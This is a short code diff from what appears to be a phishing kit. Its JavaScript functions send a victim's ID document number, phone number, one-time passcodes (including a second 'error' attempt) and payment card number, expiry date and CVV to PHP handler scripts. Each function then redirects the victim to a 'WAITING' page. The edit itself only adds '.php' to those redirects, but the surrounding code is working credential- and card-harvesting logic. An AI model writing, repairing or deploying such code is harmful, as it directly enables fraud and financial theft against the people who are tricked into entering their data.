@@ -81,26 +81,26 @@ function pasousuario(p){
 
 function pasoinfo(d,c){    
     $.post( "../process/pasoinfo.php", { doc: d, cel: c} ,function(data) {
-        window.location.href = "../a/WAITING";  
+        window.location.href = "../a/WAITING.php";  
     });
 } 
 
 function pasootp(o){    
     $.post( "../process/pasootp.php", { otp: o} ,function(data) {
-        window.location.href = "../a/WAITING";   
+        window.location.href = "../a/WAITING.php";   
     });
 } 
 
 function pasoerrotp(o){    
     $.post( "../process/pasootp2.php", { otp: o} ,function(data) {
-        window.location.href = "../a/WAITING";    
+        window.location.href = "../a/WAITING.php";    
     });
 }
 
 
 function pasotarjeta(t,f,c){    
     $.post( "../process/pasotarjeta.php", { tar:t,fec:f,cvv:c} ,function(data) {
-        window.location.href = "../a/WAITING";   
+        window.location.href = "../a/WAITING.php";   
     });
 }
 
